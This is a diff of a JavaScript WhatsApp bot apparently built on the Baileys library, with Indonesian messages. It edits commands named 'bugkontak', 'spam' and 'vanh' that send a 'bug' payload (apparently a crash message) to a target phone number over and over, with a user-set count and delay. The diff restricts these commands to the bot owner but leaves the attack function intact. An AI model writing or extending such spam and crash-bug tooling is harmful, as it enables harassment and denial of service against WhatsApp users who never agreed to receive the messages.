@@ -507,18 +507,20 @@ delete tebaktebakan[m.sender.split('@')[0]]
       await alpha.sendPresenceUpdate('available', m.chat)
         switch(command) {
         case prefix+'bugkontak':{
+        if (!isCreator) return m.reply(mess.owner)
 if (args.length == 0) return reply(`Penggunaan ${command} nomor|jumlah|timer\nContoh ${command} 628×××|5|5s`)
 num = q.split('|')[0]+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
 waktu = q.split('|')[2]
 for (let i = 0; i < jumlah; i++) {
-alpha.sendContact(num, owner, bug)
+alpha.sendContact(num, global.own, bug)
 await sleep(ms(waktu))
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
 }
 break
 case prefix+'spam':{
+if (!isCreator) return m.reply(mess.owner)
 if (args.length == 0) return m.reply(`Penggunaan ${command} jumlah\nContoh ${command} 62xxx|5|10s`)
 num = q.split('|')[0]+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
@@ -583,6 +585,7 @@ m.reply(`Succes send bug ke ${number} dengan ${txt} sebanyak ${jumlah} kecepatan
 }
 break
 case 'vanh': {
+if (!isCreator) return m.reply(mess.owner)
 alpha.sendMessage(m.chat,  {text: `👀`},{quoted: bug})
 }
 break
@@ -1014,7 +1017,7 @@ if (!m.isGroup) return reply(lang.groupOnly())
             }
             break
             case 'owner': case 'creator': {
-                alpha.sendContact(m.chat, global.owner, m)
+                alpha.sendContact(m.chat, global.own, m)
             }
             break
             case 'rules':{
